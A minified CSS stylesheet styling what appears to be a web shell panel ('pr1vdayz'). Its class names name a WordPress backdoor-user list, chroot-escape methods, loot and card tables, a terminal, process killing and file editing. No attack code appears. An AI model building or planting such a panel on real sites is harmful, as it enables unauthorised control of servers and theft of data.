translateY(0)}57%{transform:scale(1) translateY(var(--fa-bounce-rebound,-.125em))}64%{transform:scale(1) translateY(0)}to{transform:scale(1) translateY(0)}}@keyframes fa-fade{50%{opacity:var(--fa-fade-opacity,.4)}}@keyframes fa-beat-fade{0%,to{opacity:var(--fa-beat-fade-opacity,.4);transform:scale(1)}50%{opacity:1;transform:scale(var(--fa-beat-fade-scale,1.125))}}@keyframes fa-flip{50%{transform:rotate3d(var(--fa-flip-x,0),var(--fa-flip-y,1),var(--fa-flip-z,0),var(--fa-flip-angle,-180deg))}}@keyframes fa-shake{0%{transform:rotate(-15deg)}4%{transform:rotate(15deg)}8%,24%{transform:rotate(-18deg)}12%,28%{transform:rotate(18deg)}16%{transform:rotate(-22deg)}20%{transform:rotate(22deg)}32%{transform:rotate(-12deg)}36%{transform:rotate(12deg)}40%,to{transform:rotate(0deg)}}@keyframes fa-spin{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}
/* pr1vdayz theme */
.pr1vd4yz-link,.pr1vd4yz-lite-row,.pr1vd4yz-proc-cmd{white-space:nowrap;text-overflow:ellipsis}.pr1vd4yz-file-link,.pr1vd4yz-link,.pr1vd4yz-lite-row,.pr1vd4yz-lite-val,.pr1vd4yz-proc-cmd{text-overflow:ellipsis}.pr1vd4yz-table-func,.pzcard-table,.pzloot-table,.wp_pr1vd00r-users table{border-collapse:collapse}:root{--primary:#ffffff;--secondary:#f6f6fa;--accent:#e53935;--accent-hover:#b71c1c;--text:#252525;--highlight:#f44336;--danger:#ff3547;--success:#15b39a;--warning:#ffd600;--border:#eaeaea;--shadow:0 2px 12px 0 rgba(230, 57, 53, 0.08)}body{font-family:'Fira Mono';background:var(--primary);color:var(--text);margin:0;padding:0;overflow-x:hidden;font-size:15px;line-height:1.6}.pr1vd4yz-lite-uname{font-family:inherit;font-size:.72em;font-weight:400;color:#e53935;background:#fff;border-bottom:2px solid #e53935;border-top:2.5px solid #fdecec;padding:13px 22px 10px;margin-bottom:12px;letter-spacing:.04em;display:flex;align-items:center;gap:12px;position:relative;overflow-x:auto}.pr1vd4yz-lite-dot{display:inline-block;width:9px;height:9px;border-radius:50%;background:linear-gradient(135deg,#e53935 60%,#fff 100%);margin-right:10px;box-shadow:0 0 8px #e53935,0 0 2px #fff}.pr1vd4yz-lite-info{background:#fff;border-left:3px solid #e53935;border-radius:0 9px 9px 0;margin-bottom:16px;padding:8px 0;display:grid;grid-template-columns:repeat(2,1fr);gap:0;box-shadow:0 1px 10px 0 #f8eaea10}.pr1vd4yz-lite-row{font-family:inherit;font-size:.77em;color:#232324;padding:5px 20px;border-bottom:1px dashed #fbe8e8;display:flex;align-items:center;gap:7px;min-width:0;overflow:hidden;background:#fff}.pr1vd4yz-lite-row:nth-child(odd),.pzloot-table tr:nth-child(2n){background:#fff7f7}.pr1vd4yz-lite-row:nth-child(2n),.pzcard-table{background:#fff}.pr1vd4yz-lite-key{font-weight:400;letter-spacing:.05em;text-align:right;display:inline-block}.pr1vd4yz-lite-val{font-family:inherit;padding-left:7px;flex:1 1 0;overflow:hidden}.pr1vd4yz-row,.pr1vd4yz-table-head{grid-template-columns:7fr 2fr 2fr 2fr}.pr1vd4yz-lite-breadcrumb{background:#fff;padding:10px 18px 9px 14px;border-left:3px solid #e53935;border-radius:0 9px 9px 0;font-family:inherit;font-size:.99em;color:#e53935;display:flex;align-items:center;gap:2px;margin-bottom:22px;flex-wrap:wrap;min-height:33px;box-shadow:0 1px 8px 0 #fbe8e88c}.pr1vd4yz-lite-bc,.pr1vd4yz-lite-bc-btn{color:#e53935;text-decoration:none;font-weight:400;padding:0;margin:0;border-radius:0;transition:background .13s,color .13s;font-size:.96em;display:inline}#pr1vd4yz-file-modal .editor-btn-cancel:hover,.fileedit-btn-cancel:hover,.pr1vd4yz-delete:hover,.pr1vd4yz-lite-bc:hover,.pr1vd4yz-wiz-btn-light.code-editor-mode:hover,.pr1vd4yz-wiz-btn-light:hover{background:#fdecec;color:#b71c1c}.pr1vd4yz-lite-bc-sep{color:#d32f2f;font-size:1.04em;font-weight:400;margin:0 1.5px}.pr1vd4yz-lite-home{color:#b71c1c;background:#ffe8e7}.pr1vd4yz-lite-bc-btn{margin-left:auto;background:#e53935;color:#fff;font-size:.94em;font-weight:400;border-radius:6px;padding:5px 15px 5px 10px;display:flex;align-items:center;gap:5px;transition:background .13s;border:none}.pr1vd4yz-btn:hover,.pr1vd4yz-filelist-btn:hover,.pr1vd4yz-kill-btn:hover,.pr1vd4yz-lite-bc-btn:hover,.pr1vd4yz-term-send:hover,.prv-header2-btn-green:hover{background:#b71c1c;color:#fff}.pr1vd4yz-table-shell{background:#fff;border:1.5px solid #f4f4f4;border-radius:13px;box-shadow:0 2px 16px 0 #f4433610;margin-bottom:18px;overflow:hidden}.pr1vd4yz-table-head{display:grid;gap:0;background:#fff5f5;color:#e53935;font-family:'Fira Mono','Fira Mono',monospace;font-size:1em;font-weight:400;padding:0;border-bottom:2px solid #fdecec;height:44px}.pr1vd4yz-th{display:flex;align-items:center;justify-content:flex-start;padding:0 14px;height:100%;font-size:1em;letter-spacing:.02em}.pr1vd4yz-center,.pr1vd4yz-th-center{justify-content:center}.pr1vd4yz-th-main{gap:13px}.pr1vd4yz-check{accent-color:#e53935;width:17px;height:17px;margin-right:5px}.pr1vd4yz-table-body{max-height:60vh;overflow-y:auto;background:#fff;font-family:inherit}.pr1vd4yz-row{display:grid;align-items:stretch;border-bottom:1.2px solid #f4f4f4;transition:background .12s;font-size:.98em;gap:0}.pr1vd4yz-row:hover,.pr1vd4yz-table-func tbody tr:hover,.pr1vd4yz-table-net tbody tr:hover,.pr1vd4yz-table-proc tbody tr:hover{background:#fff2f2}.pr1vd4yz-td{display:flex;align-items:center;padding:10px 14px;min-width:0;overflow:hidden}.pr1vd4yz-main{gap:12px}.pr1vd4yz-td-icon{font-size:1.14em;min-width:20px;text-align:center}.chroot-escape-method .mfail,.pr1vd4yz-delete,.pr1vd4yz-file-readonly,.pr1vd4yz-folder,.pr1vd4yz-icon-red,.pr1vd4yz-link-folder,.pr1vd4yz-net-local,.pr1vd4yz-perm-red,.pr1vd4yz-search-lnum,.pr1vd4yz-search-nores,.prv-logo2-txt,.pzcard-btn:hover{color:#e53935}.pr1vd4yz-file{color:#b71c1c;font-weight:400}.pr1vd4yz-td-data{display:flex;flex-direction:column;min-width:0}.pr1vd4yz-link{font-weight:400;text-decoration:none;transition:color .14s;overflow:hidden}.pr1vd4yz-file-link:hover,.pr1vd4yz-link-folder:hover,.pr1vd4yz-proc-mem,.pr1vd4yz-search-snip,.pzcard-logitem-fail{color:#b71c1c}.pr1vd4yz-link-file{color:#5b5b5b}.pr1vd4yz-link-file:hover{color:#388e3c}.pr1vd4yz-mobile-info,.prv-fm-upload-input,.prv-upload-file,.prv-upload-file2{display:none}.pr1vd4yz-info-dir{color:#e53935;font-weight:400;font-size:.95em}.pr1vd4yz-info-size{color:#d32f2f;font-size:.97em}.pr1vd4yz-info-perm{font-size:.97em;font-weight:400}.pr1vd4yz-perm-w{color:#43a047}.pr1vd4yz-net-status,.pr1vd4yz-perm-ro{color:#d32f2f}.pr1vd4yz-actions{gap:7px}.pr1vd4yz-action{margin-right:7px;display:inline-flex;align-items:center}.pr1vd4yz-action:last-child{margin-right:0}.pr1vd4yz-rename{color:#0074d9}.pr1vd4yz-rename:hover{background:#f0f8ff;color:#0053a6}.pr1vd4yz-chmod{color:#dca700}.pr1vd4yz-chmod:hover{background:#fffbea;color:#b68b00}.pr1vd4yz-download{color:#2e7d32}.pr1vd4yz-download:hover{background:#e8f5e9;color:#005c1a}.pr1vd4yz-table-foot{background:#fff6f6;border-top:1.2px solid #f4f4f4;padding:14px 12px;display:flex;flex-wrap:wrap;gap:9px;align-items:center;justify-content:flex-end}.pr1vd4yz-select{background:#fff;color:#e53935;border:1.1px solid #fdecec;border-radius:7px;padding:6px 16px;font-family:inherit;font-size:.98em;font-weight:400;outline:0;transition:border .12s}.pr1vd4yz-filelist-select:focus,.pr1vd4yz-httpreq-inp:focus,.pr1vd4yz-httpreq-tarea:focus,.pr1vd4yz-select:focus,.pr1vd4yz-terminal-input:focus,.pr1vd4yz-terminal-neo-input:focus,.pr1vd4yz-waf-inp:focus,.pzcard-input:focus,.pzcard-textarea:focus{border-color:#e53935}.pr1vd4yz-btn{background:#e53935;color:#fff;display:flex;align-items:center}@media (max-width:1050px){.pr1vd4yz-row,.pr1vd4yz-table-head{grid-template-columns:6fr 2.5fr 2.5fr 2.5fr}}.pr1vd4yz-modal-bg{inset:0;background:rgba(30,28,28,.22);display:flex;align-items:center;justify-content:center}.pr1vd4yz-modal-wizard{background:#fff;box-shadow:0 10px 48px 0 #e5393530}.pr1vd4yz-modal-header-wiz{display:flex;align-items:center;background:#fff5f5}.pr1vd4yz-wiz-icon{background:#e53935;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 12px #fdecec}.pr1vd4yz-wiz-title,.prv-chip-mini{font-weight:400}.pr1vd4yz-wiz-desc{opacity:.77}.pr1vd4yz-wiz-section{display:flex;align-items:flex-start;gap:13px;padding:16px 40px 0}.pr1vd4yz-wiz-section-icon{background:#fdecec;color:#e53935;font-size:1.21em;border-radius:8px;width:33px;height:33px;display:flex;align-items:center;justify-content:center;margin-top:4px}.pr1vd4yz-red{background:#ffe8e7!important;color:#b71c1c!important}.pr1vd4yz-wiz-fields{flex:1;display:flex;flex-direction:column;gap:7px}.pr1vd4yz-wiz-input{border:1.2px solid #fdecec;border-radius:8px;outline:0;transition:border .13s,box-shadow .11s}.pr1vd4yz-wiz-editorarea:focus,.pr1vd4yz-wiz-input:focus{border-color:#e53935;box-shadow:0 0 0 1.5px #fdecec}.pr1vd4yz-modal-actions-wiz{display:flex;justify-content:flex-end;gap:12px}.pr1vd4yz-wiz-btn{font-weight:400;display:flex;align-items:center;font-family:inherit}.pr1vd4yz-wiz-btn-red,.pr1vd4yz-wiz-btn-red.code-editor-mode,.prv-act-btn-green{background:#e53935;color:#fff;border:1.1px solid #e53935}.pr1vd4yz-wiz-btn-red.code-editor-mode:hover,.pr1vd4yz-wiz-btn-red:hover{background:#b71c1c;color:#fff;border-color:#b71c1c}.pr1vd4yz-wiz-fields input,.pr1vd4yz-wiz-fields select,.pr1vd4yz-wiz-input{font-size:13px;padding:7px 8px;font-family:'Fira Mono'}.pr1vd4yz-wiz-editorform{flex:1 1 0;display:flex;flex-direction:column}.pr1vd4yz-editor-actions{display:flex;justify-content:flex-end;gap:7px;margin-bottom:7px}.pr1vd4yz-wiz-editorarea{width:100%;min-height:340px;height:56vh;max-height:62vh;border-radius:8px;padding:13px 14px;outline:0;resize:vertical}@media (max-width:800px){.pr1vd4yz-lite-info{grid-template-columns:1fr;border-radius:0 0 9px 9px}.pr1vd4yz-lite-row{font-size:.97em;padding:4px 11px}.pr1vd4yz-row,.pr1vd4yz-table-head{grid-template-columns:1fr 1.5fr 1.5fr}.pr1vd4yz-td.pr1vd4yz-center.pr1vd4yz-actions,.pr1vd4yz-th-center:last-child{grid-column:span 3/auto}.pr1vd4yz-modal-wizard{max-width:96vw}.pr1vd4yz-modal-actions-wiz,.pr1vd4yz-modal-header-wiz,.pr1vd4yz-wiz-section{padding-left:15px;padding-right:15px}.pr1vd4yz-wiz-section{gap:7px}.pr1vd4yz-wiz-editorarea{min-height:160px;font-size:12px}}.pr1vd4yz-wiz-editorarea,.pr1vd4yz-wiz-input[type=textarea],textarea.pr1vd4yz-wiz-editorarea,textarea.pr1vd4yz-wiz-input{background:#fff!important;color:#232324!important;border:1.3px solid #e3e3e3;font-family:'Fira Mono','Fira Mono',Consolas,monospace;font-size:13px;line-height:1.45;transition:border .13s,box-shadow .11s}.pr1vd4yz-wiz-editorarea,.pr1vd4yz-wiz-input,textarea{background:#fff!important;color:#232324!important}.pr1vd4yz-terminal-body{flex:1 1 0;display:flex;flex-direction:column;min-height:0;background:#fff;border-bottom-left-radius:20px;border-bottom-right-radius:20px}.pr1vd4yz-terminal-output{flex:1 1 0;width:100%;background:#fff;color:#232324;border:none;font-family:'Fira Mono','Fira Mono',monospace;font-size:13px;line-height:1.38;resize:none;padding:15px 18px;margin:0;outline:0;border-bottom:1.5px solid #fdecec;border-radius:0;min-height:220px;max-height:39vh;transition:background .11s,border .13s}.pr1vd4yz-terminal-form{display:flex;align-items:center;border-top:1.5px solid #fdecec;background:#fff;padding:14px 18px;gap:0}.pr1vd4yz-terminal-input{flex:1 1 0;border:1.1px solid #fdecec;background:#fff;color:#e53935;font-family:inherit;font-size:13px;padding:9px 13px;border-radius:8px 0 0 8px;font-weight:400;transition:border .13s;outline:0}.pr1vd4yz-wiz-btn-green{background:#12b886;color:#fff;border:1.1px solid #12b886;border-radius:0 8px 8px 0}.pr1vd4yz-wiz-btn-green:hover{background:#077c5c;border-color:#077c5c}.pr1vd4yz-card-title{display:flex;align-items:center;letter-spacing:.01em}.pr1vd4yz-info-box{display:flex;align-items:center;gap:10px;background:#f5faff;color:#1a1a1a;font-size:.98em;border-radius:8px;padding:11px 17px;margin-bottom:19px}.pr1vd4yz-icon-blue,.pr1vd4yz-icon-green{font-size:1.2em}.pr1vd4yz-table-net,.pr1vd4yz-table-proc{width:100%;border-collapse:collapse;min-width:500px;background:#fff;font-size:.99em;font-family:'Fira Mono','Fira Mono',monospace}.pr1vd4yz-table-net thead th{background:#fff6f6;color:#e53935;font-weight:400;padding:13px 9px;border-bottom:1.2px solid #fdecec;text-align:left;font-size:1em}.pr1vd4yz-table-net tbody td{padding:11px 9px;border-bottom:1.2px solid #fbe8e8;font-weight:400;color:#232324}.pr1vd4yz-net-remote,.pr1vd4yz-proc-user{color:#12b886}.pr1vd4yz-net-pid{color:#1a1a1a;font-weight:400}.pr1vd4yz-table-proc thead th{background:#fff6f6;color:#e53935;font-weight:400;padding:13px 9px;border-bottom:1.2px solid #fdecec;text-align:left}.pr1vd4yz-table-proc tbody td{padding:10px 7px;border-bottom:1.2px solid #fbe8e8;font-weight:400;color:#232324;font-size:.98em}.pr1vd4yz-lite-val,.pr1vd4yz-proc-pid{color:#e53935;font-weight:500}.pr1vd4yz-dir .pr1vd4yz-file-icon i,.pr1vd4yz-perm-yellow,.pr1vd4yz-proc-cpu{color:#fbbf24}.pr1vd4yz-proc-cmd{font-family:inherit;max-width:180px;overflow:hidden}.pr1vd4yz-mono,.pr1vd4yz-table-func,.pr1vd4yz-term-output,.pr1vd4yz-term-prompt{font-family:'Fira Mono','Fira Mono',monospace}.pr1vd4yz-kill-btn{background:#e53935;color:#fff;border-radius:7px;font-size:.94em;padding:6px 12px;transition:background .13s,color .13s;border:none;outline:0;margin-left:0;display:inline-flex;align-items:center;gap:5px}@media (max-width:700px){.pr1vd4yz-row,.pr1vd4yz-table-head{grid-template-columns:1fr}.pr1vd4yz-hide-mobile{display:none}.pr1vd4yz-main{flex-direction:column;align-items:flex-start;gap:2px}.pr1vd4yz-mobile-info{display:flex;gap:10px;margin-top:2px;font-size:.95em}.pr1vd4yz-td{padding:9px 7px}.pr1vd4yz-table-foot{padding:9px 5px}.pr1vd4yz-table-net tbody td,.pr1vd4yz-table-net thead th{padding:8px 4px;font-size:.96em}.pr1vd4yz-card-header,.pr1vd4yz-card-section{padding-left:7px;padding-right:7px}.pr1vd4yz-table-proc tbody td,.pr1vd4yz-table-proc thead th{padding:7px 3px;font-size:.96em}.pr1vd4yz-proc-cmd{max-width:90px}}.pr1vd4yz-card-subtitle,.pr1vd4yz-card-title,.pzcard-header,.pzcard-info{display:flex;align-items:center}.pr1vd4yz-func-overview{display:flex;flex-wrap:wrap;gap:21px;margin-bottom:19px}.pr1vd4yz-func-stat{display:flex;align-items:center;gap:11px;background:#f9f6f6;border-radius:9px;padding:13px 19px;min-width:0;box-shadow:0 1px 6px #fdecec70}.pr1vd4yz-func-label{font-size:.89em;color:#b7b7b7;font-weight:400;letter-spacing:.04em;text-transform:uppercase}.pr1vd4yz-func-value{font-size:1em;color:#232324;letter-spacing:.01em}.pr1vd4yz-table-wrap{overflow-x:auto;border-radius:11px;box-shadow:0 1px 9px #e5393535}.pr1vd4yz-table-func{width:100%;min-width:300px;background:#fff;font-size:.99em}.pr1vd4yz-badge-danger,.pr1vd4yz-badge-success{padding:2.5px 11px;border-radius:7px;font-size:.95em;font-weight:400}.pr1vd4yz-table-func thead th{background:#fff6f6;color:#e53935;font-weight:400;padding:10px 9px;border-bottom:1.2px solid #fdecec;text-align:left;font-size:1em}.pr1vd4yz-table-func tbody td{padding:10px 9px;border-bottom:1.2px solid #fbe8e8;color:#232324}.pr1vd4yz-badge-danger{background:#fff0f0;color:#e53935}.pr1vd4yz-badge-success{background:#e7fcf4;color:#15b39a}.pr1vd4yz-mono{font-size:.97em}@media (max-width:900px){.pr1vd4yz-func-overview{flex-direction:column;gap:12px}.pr1vd4yz-card-header,.pr1vd4yz-card-section{padding-left:8px;padding-right:8px}.pr1vd4yz-table-func tbody td,.pr1vd4yz-table-func thead th{padding:7px 4px;font-size:.96em}}.pr1vd4yz-term-modal-bg{position:fixed;inset:0;z-index:101;background:rgba(245,245,245,.91);backdrop-filter:blur(2px);display:flex;align-items:center;justify-content:center}.pr1vd4yz-term-modal{width:100%;max-width:730px;min-width:0;height:74vh;min-height:380px;background:linear-gradient(135deg,#fff 84%,#ffe8e7 100%);border-radius:23px;box-shadow:0 7px 48px 0 #e5393535,0 0 0 1.7px #fbe8e8 inset;border:2.4px solid #e53935;overflow:hidden;position:relative;display:flex;flex-direction:column;outline:#fdecec solid .5rem;outline-offset:-1rem}.pr1vd4yz-term-header{display:flex;align-items:center;justify-content:space-between;background:linear-gradient(90deg,#fff,#fff8f8 90%,#ffe8e7 100%);border-bottom:1.6px solid #fdecec;padding:19px 32px 14px 26px;position:relative}.pr1vd4yz-term-led{width:13px;height:13px;background:radial-gradient(circle,#e53935 65%,#fff2f2 100%);border-radius:50%;margin-right:17px;box-shadow:0 0 10px #e5393599,0 0 2px #fdecec}.pr1vd4yz-term-title{font-size:1.19em;color:#e53935;font-weight:400;letter-spacing:.04em;text-shadow:0 1px 0 #fff;display:flex;align-items:center;gap:8px;text-transform:uppercase}.pr1vd4yz-term-close-btn{font-size:2em;color:#e53935;background:0 0;border:none;line-height:1;padding:0 12px;border-radius:10px;transition:background .15s,color .13s}.pr1vd4yz-term-close-btn:hover{background:#fdecec;color:#fff}.pr1vd4yz-term-content{flex:1 1 0;display:flex;flex-direction:column;min-height:0;background:0 0;padding:0 0 10px}.pr1vd4yz-term-screen{position:relative;flex:1 1 0;background:linear-gradient(120deg,#fff 90%,#fff4f4 100%);border-bottom:1.6px solid #fdecec;border-radius:0 0 14px 14px;margin:23px 32px 0;box-shadow:0 2px 19px #e5393522;overflow:hidden;display:flex;align-items:stretch}.pr1vd4yz-term-shadow{content:"";display:block;position:absolute;z-index:1;left:0;right:0;top:0;height:16px;background:linear-gradient(180deg,#fdecec 50%,rgba(255,255,255,.01));pointer-events:none}.pr1vd4yz-term-output{flex:1 1 0;width:100%;min-height:180px;max-height:31vh;background:0 0;color:#232324;border:none;font-size:14px;line-height:1.5;padding:18px 19px 17px 12px;outline:0;resize:none;z-index:2;white-space:pre-line;word-break:break-word}.pr1vd4yz-term-form{display:flex;align-items:center;margin:18px 32px 0;gap:0;background:#fff;border-radius:8px;box-shadow:0 2px 9px #e5393533;border:1.3px solid #fdecec;position:relative}.pr1vd4yz-term-prompt{color:#e53935;font-weight:400;font-size:1em;padding:0 11px;border-right:1.2px solid #fdecec;display:flex;align-items:center;background:#fff7f7;border-radius:8px 0 0 8px;min-width:0;position:relative}.pr1vd4yz-term-dot{width:7px;height:7px;margin-right:9px;border-radius:50%;background:#e53935;box-shadow:0 0 8px #e5393580;display:inline-block}.pr1vd4yz-term-input{flex:1 1 0;border:none;background:0 0;color:#e53935;font-family:inherit;font-size:1.09em;padding:13px;font-weight:400;outline:0;transition:background .12s;border-radius:0}.pr1vd4yz-term-send{background:#e53935;color:#fff;border:none;border-radius:0 8px 8px 0;padding:0 21px;font-size:1.12em;margin-left:0;cursor:pointer;transition:background .12s;outline:0;display:flex;align-items:center;height:44px}@media (max-width:950px){.pr1vd4yz-term-modal{max-width:99vw}.pr1vd4yz-term-form,.pr1vd4yz-term-header,.pr1vd4yz-term-screen{margin-left:8px;margin-right:8px}}.pr1vd4yz-card{background:#fff;border-radius:17px;border:1.6px solid #fdecec;box-shadow:0 2px 14px #e5393530;margin-bottom:28px;padding:0 0 30px}.pr1vd4yz-card-header{display:flex;align-items:center;justify-content:space-between;padding:23px 28px 7px;border-bottom:1.2px solid #fdecec;background:#fff}.pr1vd4yz-btn,.pr1vd4yz-card-title{align-items:center;font-weight:400}.pr1vd4yz-card-title{font-size:1.19em;color:#e53935;display:flex;gap:10px}.pr1vd4yz-file .pr1vd4yz-file-icon i,.pr1vd4yz-httpreq-select,.pr1vd4yz-icon-blue,.pr1vd4yz-perm-blue{color:#1a1a1a}.pr1vd4yz-file-writable,.pr1vd4yz-icon-green{color:#15b39a}.pr1vd4yz-btn{display:inline-flex;gap:7px;padding:8px 21px;border-radius:8px;font-size:.98em;border:none;text-decoration:none;transition:background .13s,color .13s;outline:0;cursor:pointer}.pr1vd4yz-btn-blue{background:#1a1a1a;color:#fff}.pr1vd4yz-btn-blue:hover{background:#003c8f;color:#fff}.pr1vd4yz-btn-green{background:#15b39a;color:#fff}.pr1vd4yz-btn-green:hover{background:#108267;color:#fff}.pr1vd4yz-card-section{padding:23px 28px 0}.pr1vd4yz-card-subtitle{font-size:1.08em;font-weight:400;color:#e53935;display:flex;align-items:center;gap:8px;margin-bottom:15px}.pr1vd4yz-db-form{margin-bottom:18px}.pr1vd4yz-db-form-grid{display:grid;grid-template-columns:1fr 1fr;gap:19px;margin-bottom:18px}.pr1vd4yz-db-label{display:block;font-size:.93em;color:#e53935;font-weight:400;margin-bottom:7px;font-family:'Fira Mono','Fira Mono',monospace}.prv-header-bar,.prv-logo{display:flex;align-items:center}.pr1vd4yz-db-input{width:100%;background:#fff;color:#e53935;border:1.3px solid #fdecec;border-radius:8px;padding:10px 12px;font-size:1em;font-family:inherit;outline:0;transition:border .13s,box-shadow .11s}.prv-chip,.prv-logo-txt{font-family:'Fira Mono','Fira Mono',monospace}.pr1vd4yz-db-input:focus{border-color:#e53935;box-shadow:0 0 0 2px #fdecec}.prv-header{border-bottom:2.5px solid #fdecec;box-shadow:0 5px 36px #e5393522;top:0;z-index:100}.prv-header-bar{justify-content:space-between;gap:22px}.prv-logo{font-size:1.22em;font-weight:400;color:#e53935;letter-spacing:.08em;position:relative}.prv-logo-led{box-shadow:0 0 8px #e5393599;position:absolute;left:-15px;top:11px}.prv-logo-txt{margin-left:7px}.prv-ver{color:#e53935;font-weight:400;letter-spacing:.03em}.prv-logo-dot{display:inline-block;margin-left:8px;box-shadow:0 0 7px #e5393580}.prv-actions,.prv-upload{display:flex;align-items:center;gap:10px}.prv-act-btn{display:flex;align-items:center;font-weight:400;cursor:pointer;text-decoration:none}.prv-menu ul,.prv-upload-form{align-items:center;display:flex;margin:0}.prv-upload-form{gap:7px}.prv-header-menu,.prv-menu{width:100%;background:#fff;border-top:1.7px solid #fdecec}.prv-menu ul{flex-wrap:wrap;gap:4px 2px;padding:5px 10px;list-style:none;overflow-x:auto}.prv-menu li{display:inline-flex}.prv-chip{display:flex;align-items:center;gap:8px;font-size:12px;font-weight:400;border:1.2px solid #fdecec;position:relative;box-shadow:0 1px 7px #fdecec35}.pr1vd4yz-action:hover,.pr1vd4yz-sym-btn:hover,.prv-act-btn-green:hover,.prv-act-btn:hover,.prv-chip.active,.prv-chip:focus,.prv-chip:hover,.prv-header2-btn-green{background:#e53935;color:#fff;border-color:#e53935}.prv-badge-dot{box-shadow:0 0 6px #15b39a80}.prv-menu ul::-webkit-scrollbar,.prv-menu::-webkit-scrollbar{height:0}.pr1vd4yz-filelist-root{background:#fff;border-radius:11px;border:2px solid #fdecec;box-shadow:0 3px 16px #e5393533;margin-bottom:16px}.pr1vd4yz-file-row,.pr1vd4yz-filelist-head{display:grid;grid-template-columns:34px 38px 1.6fr 1fr 1fr 1.6fr 1.2fr;align-items:center;font-size:.79em}.pr1vd4yz-filelist-head{background:#fff5f5;color:#e53935;border-bottom:2px solid #fdecec;padding:0;min-height:39px;text-transform:lowercase;letter-spacing:.04em}.pr1vd4yz-file-hcol{padding:7px 6px}.pr1vd4yz-file-hactions,.pr1vd4yz-file-hcheck,.pr1vd4yz-file-hicon{width:34px}.pr1vd4yz-file-hname{min-width:190px}.pr1vd4yz-file-hperm,.pr1vd4yz-file-hsize{text-align:right;min-width:60px}.pr1vd4yz-file-row{background:#fff;border-bottom:1px solid #f6f2f2;min-height:41px;transition:background .13s,border .13s;position:relative}.pr1vd4yz-file-row:hover{background:#fff2f2;border-left:3px solid #e53935;z-index:1}.pr1vd4yz-file-col{padding:8px 7px;display:flex;align-items:center;min-width:0}.pr1vd4yz-file-check input{accent-color:#e53935;width:15px;height:15px}.pr1vd4yz-file-icon i{font-size:1.22em;color:#e53935}.pr1vd4yz-file-link{color:#e53935;font-family:'Fira Mono',monospace;text-decoration:none;letter-spacing:.01em;overflow:hidden;white-space:nowrap}.pr1vd4yz-file-ext{margin-left:8px;background:#f3f4f6;color:#000;font-size:.72em;border-radius:6px;padding:1.5px 8px}.pr1vd4yz-file-perm{font-family:'Fira Mono',monospace;text-align:right}.pr1vd4yz-file-size{color:#1a1a1a;font-family:'Fira Mono';font-size:.97em;text-align:right}.pr1vd4yz-file-actions{display:flex;gap:7px;align-items:center;justify-content:flex-end;width:100%}.pr1vd4yz-action{background:#fff;color:#e53935;border:1px solid #fdecec;border-radius:6px;padding:4px 10px;font-size:1em;cursor:pointer;text-decoration:none;transition:background .12s,color .12s,border .13s}.pr1vd4yz-filelist-foot{display:flex;align-items:center;justify-content:flex-end;gap:10px;padding:11px 16px 6px;border-top:1px solid #f6f2f2}.pr1vd4yz-filelist-select{background:#fff;color:#e53935;border:1.1px solid #fdecec;border-radius:7px;padding:6px 16px;font-family:inherit;font-size:.87em;outline:0;transition:border .12s}.pr1vd4yz-filelist-btn{background:#e53935;color:#fff;border:none;padding:7px 19px;border-radius:8px;font-size:.97em;display:flex;align-items:center;gap:7px;transition:background .13s,color .13s;cursor:pointer}@media (max-width:1100px){.pr1vd4yz-file-row,.pr1vd4yz-filelist-head{grid-template-columns:27px 24px 1.2fr 0.8fr 0.8fr 1.2fr 0.9fr;font-size:.97em}}@media (max-width:800px){.pr1vd4yz-modal-wizard{max-width:99vw}.pr1vd4yz-terminal-output{font-size:12px;padding:8px 7px}.pr1vd4yz-terminal-form{padding:7px 6px}.pr1vd4yz-file-row,.pr1vd4yz-filelist-head{grid-template-columns:18px 19px 1fr 0.5fr 0.7fr 1.2fr 0.8fr;font-size:.94em}.pr1vd4yz-filelist-foot{padding:8px 7px 4px}}.pr1vd4yz-modal-bg.code-editor-mode{z-index:19999!important;background:rgba(220,20,60,.07)!important}.pr1vd4yz-modal-wizard.code-editor-mode{background:#fff;border-radius:14px;box-shadow:0 14px 64px 0 #e5393535,0 0 0 2px #fdecec;max-width:770px;min-width:0;width:98vw;border:1.7px solid #fdecec;position:absolute;left:50%;top:60px;transform:translateX(-50%);display:flex;flex-direction:column;overflow:hidden;font-family:'Fira Mono'}.pr1vd4yz-modal-header-wiz.code-editor-mode{display:flex;align-items:center;gap:11px;border-radius:14px 14px 0 0;padding:14px 20px 10px;background:#fff4f4;border-bottom:1.6px solid #fdecec;position:relative;min-height:42px}.pr1vd4yz-wiz-icon.code-editor-mode{background:#e53935;color:#fff;font-size:1.5em;border-radius:10px;width:38px;height:38px;display:flex;align-items:center;justify-content:center;box-shadow:0 1px 8px #e5393522}.pr1vd4yz-root-tit,.pr1vd4yz-wiz-title.code-editor-mode{font-size:1.11em;color:#e53935;letter-spacing:.04em;margin-bottom:2px;text-transform:lowercase}.pr1vd4yz-wiz-desc.code-editor-mode{color:#b71c1c;font-size:.96em;font-weight:400;opacity:.82;letter-spacing:.01em;max-width:350px;overflow-x:auto}.pr1vd4yz-modal-close-wiz.code-editor-mode{font-size:1.6em;color:#e53935;background:0 0;border:none;line-height:1;padding:0 8px;border-radius:8px;position:absolute;right:13px;top:13px;transition:background .15s,color .12s}.fileedit-close:hover,.pr1vd4yz-ex-chain-close:hover,.pr1vd4yz-modal-close-wiz.code-editor-mode:hover,.pr1vd4yz-modal-close-wiz:hover,.pr1vd4yz-root-close:hover,.pr1vd4yz-sym-close:hover,.pr1vd4yz-terminal-neo-close:hover{color:#fff;background:#e53935}.pr1vd4yz-wiz-editorform.code-editor-mode{flex:1 1 0;display:flex;flex-direction:column;min-height:0;height:100%;padding:0}.pr1vd4yz-wiz-section.code-editor-mode{flex:1;display:flex;flex-direction:column;padding:0;height:100%}.pr1vd4yz-wiz-fields.code-editor-mode{width:100%;flex:1;display:flex;flex-direction:column;gap:0;height:100%}textarea.pr1vd4yz-wiz-editorarea.code-editor-mode{width:100%;min-height:220px;max-height:55vh;height:46vh;background:#fff;color:#e53935;border:1.3px solid #fdecec;border-radius:10px;font-family:'Fira Mono';font-size:15px;line-height:1.49;padding:13px 15px;outline:0;resize:vertical;box-shadow:0 2px 10px #e5393518;margin:0;overflow:auto;transition:border .12s,box-shadow .11s,background .12s,color .11s}textarea.pr1vd4yz-wiz-editorarea.code-editor-mode:focus{border-color:#e53935;box-shadow:0 0 0 2px #fdecec;background:#fff8f8;color:#b71c1c}.pr1vd4yz-modal-actions-wiz.code-editor-mode{display:flex;justify-content:flex-end;gap:10px;border-top:1.6px solid #fdecec;padding:12px 20px;background:#fff4f4;border-radius:0 0 14px 